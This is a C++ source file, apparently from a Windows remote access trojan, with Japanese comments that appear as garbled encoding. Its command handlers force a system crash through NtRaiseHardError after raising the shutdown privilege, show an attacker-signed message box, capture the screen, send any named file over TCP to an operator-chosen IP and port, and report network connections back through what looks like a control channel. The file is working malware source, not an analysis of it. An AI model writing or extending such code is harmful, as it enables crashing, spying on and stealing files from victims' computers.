// ���̑��̃R�}���h��
#include "Misc.h"
#include "NtAPi.h"

// NtRaiseHardError�𒼐ڌĂяo���ăV�X�e���N���b�V��
void SystemCrash(std::vector<std::string>& tokens) {
    
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, true, false, nullptr);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, nullptr);

}

// ���b�Z�[�W�{�b�N�X��\��
void ShowMessageBox(std::vector<std::string>& tokens) {
    // �f�t�H���g�̃��b�Z�[�W�ƃ^�C�g��
    std::string defaultMessage = "By Vendetta";
    std::string defaultTitle = "Hello";

    if (tokens.size() > 1) {
        defaultTitle = tokens[2];
    }
    if (tokens.size() > 2) {
        defaultMessage = tokens[1];
    }

    std::thread([defaultMessage, defaultTitle]() {
        MessageBoxA(0, defaultMessage.c_str(), defaultTitle.c_str(), MB_OK);

        }).detach();

    SendString("[+] ���b�Z�[�W�{�b�N�X��\�����܂���");
}


void CaptureScreenshot(const std::string& filename) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // �r�b�g�}�b�v�f�[�^���t�@�C���ɏ�������
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 24; // RGB
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // �t�@�C���쐬
    FILE* file;
    fopen_s(&file, filename.c_str(), "wb");
    if (file == NULL) {
        SendString("[-] �X�N�V���t�@�C���̍쐬�Ɏ��s");
        return;
    }

    // �w�b�_�[����������
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + width * height * 3;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;

    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);

    BYTE* pPixels = new BYTE[width * height * 3];
    GetDIBits(hMemoryDC, hBitmap, 0, height, pPixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    fwrite(pPixels, width * height * 3, 1, file);

    delete[] pPixels;
    fclose(file);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}



void screenshot(std::vector<std::string>& tokens) {
    std::string filename = "screenshot.bmp";
    CaptureScreenshot(filename);
}

void TransmitFileChunked(SOCKET s, HANDLE hFile, DWORD fileSize) {
    const DWORD bufferSize = 4096;  // 4KB�̃`�����N�T�C�Y
    char buffer[bufferSize];
    DWORD bytesRead = 0;
    DWORD totalBytesSent = 0;

    // �t�@�C���̓��e���`�����N���Ƃɓǂݍ��݂Ȃ��瑗�M
    while (ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {
        int bytesSent = 0;
        while (bytesSent < bytesRead) {
            int result = send(s, buffer + bytesSent, bytesRead - bytesSent, 0);
            if (result == SOCKET_ERROR) {
                closesocket(s);
                return;
            }
            bytesSent += result;
        }
        totalBytesSent += bytesRead;
    }
}
#include <future>


void UploadFile(std::vector<std::string>& tokens) {
    if (tokens.size() < 4) {
        SendString("Usage: uploadfile <filename> <ip> <port>");
        return;
    }

    std::string filename = tokens[1];
    std::string ipAddress = tokens[2];
    int port = std::stoi(tokens[3]);

    // �t�@�C�����J��
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        SendString("[-] Could not open the file.");
        return;
    }

    // �T�[�o�[�̃A�h���X����ݒ�i�w�肳�ꂽIP�ƃ|�[�g�j
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &serverAddr.sin_addr);

    // �\�P�b�g�쐬
    SOCKET uploadSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (uploadSocket == INVALID_SOCKET) {
        SendString("[-] Socket creation failed.");
        return;
    }

    // �T�[�o�[�ɐڑ�
    if (connect(uploadSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        SendString("[-] Could not connect to the server.");
        closesocket(uploadSocket);
        return;
    }

    // �t�@�C���n���h�����쐬
    HANDLE fileHandle = CreateFileA(
        filename.c_str(),         // �t�@�C����
        GENERIC_READ,             // �ǂݎ�茠��
        FILE_SHARE_READ,          // ���v���Z�X�Ƌ��L�\
        NULL,                     // �f�t�H���g�̃Z�L�����e�B����
        OPEN_EXISTING,            // �����̃t�@�C�����J��
        FILE_ATTRIBUTE_NORMAL,    // �ʏ�̃t�@�C������
        NULL                      // �e���v���[�g�t�@�C���Ȃ�
    );

    if (fileHandle == INVALID_HANDLE_VALUE) {
        SendString("[-] Could not open file handle.");
        closesocket(uploadSocket);
        return;
    }

    // �t�@�C���T�C�Y�擾
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(fileHandle, &fileSize)) {
        SendString("[-] Failed to get file size.");
        CloseHandle(fileHandle);
        closesocket(uploadSocket);
        return;
    }

    // �t�@�C�����M
    SendString("Sending file: " + filename + " (Size: " + std::to_string(fileSize.QuadPart) + " bytes)");

    BOOL result = TransmitFile(
        uploadSocket,          // �\�P�b�g
        fileHandle,            // �t�@�C���n���h��
        0,                     // �S�̂̃t�@�C���T�C�Y�i0�͂��ׂđ��M�j
        0,                     // ���M���Ƃ̃o�C�g���i0�̓f�t�H���g�j
        NULL,                  // �I�[�o�[���b�v�\����
        NULL,                  // �w�b�_�[/�g���[���[�p�̃o�b�t�@
        0                      // �t���O
    );

    if (!result) {
        SendString("[-] File send failed.");
    }
    else {
        SendString("[+] File upload complete.");
    }

    // �N���[���A�b�v
    CloseHandle(fileHandle);
    closesocket(uploadSocket);
}


void Netstat(std::vector<std::string>& tokens) {
    if (tokens.size() != 1 || tokens[0] != "netstat") {
        SendString("�g�p���@: netstat");
        return;
    }
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    if (GetExtendedTcpTable(nullptr, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == ERROR_INSUFFICIENT_BUFFER) {
        auto tcpTable = (PMIB_TCPTABLE)malloc(dwSize);
        if (tcpTable == nullptr) {
            SendString("[-] ���������蓖�ĂɎ��s���܂���");
            return;
        }

        dwRetVal = GetExtendedTcpTable(tcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
        if (dwRetVal != NO_ERROR) {
            SendString("[-] TCP�e�[�u���̎擾�Ɏ��s���܂���");
            free(tcpTable);
            return;
        }

        std::ostringstream result;
        result << "�A�N�e�B�u�Ȑڑ�\n\n";

        // �񕝂̒�`
        const int protocolWidth = 15;
        const int addressWidth = 35;
        const int stateWidth = 20;

        // �w�b�_�[�̏o��
        result << std::left
            << std::setw(protocolWidth) << "�v���g�R��"
            << std::setw(addressWidth) << "���[�J�� �A�h���X"
            << std::setw(addressWidth) << "�O���A�h���X"
            << "���\n";

        for (unsigned int i = 0; i < tcpTable->dwNumEntries; i++) {
            struct in_addr localIp, remoteIp;
            localIp.S_un.S_addr = tcpTable->table[i].dwLocalAddr;
            remoteIp.S_un.S_addr = tcpTable->table[i].dwRemoteAddr;
            unsigned short localPort = ntohs((unsigned short)(tcpTable->table[i].dwLocalPort));
            unsigned short remotePort = ntohs((unsigned short)(tcpTable->table[i].dwRemotePort));

            // ��Ԃ̐ݒ�
            const char* state;
            switch (tcpTable->table[i].dwState) {
            case MIB_TCP_STATE_ESTAB: state = "ESTABLISHED"; break;
            case MIB_TCP_STATE_LISTEN: state = "LISTENING"; break;
            case MIB_TCP_STATE_CLOSE_WAIT: state = "CLOSE_WAIT"; break;
            case MIB_TCP_STATE_LAST_ACK: state = "LAST_ACK"; break;
            default: state = "UNKNOWN"; break;
            }

            // IP�A�h���X�ƃ|�[�g������
            std::ostringstream localAddr, remoteAddr;
            localAddr << inet_ntoa(localIp) << ":" << localPort;
            remoteAddr << inet_ntoa(remoteIp) << ":" << remotePort;

            // ���`���ꂽ�s���o��
            result << std::left
                << std::setw(protocolWidth) << "TCP"
                << std::setw(addressWidth) << localAddr.str()
                << std::setw(addressWidth) << remoteAddr.str()
                << state << "\n";
        }

        SendString(result.str().empty() ? "�A�N�e�B�u��TCP�ڑ��͂���܂���" : result.str());
        free(tcpTable);
    }
    else {
        SendString("[-] TCP�e�[�u���̃T�C�Y���擾�ł��܂���ł���");
    }
}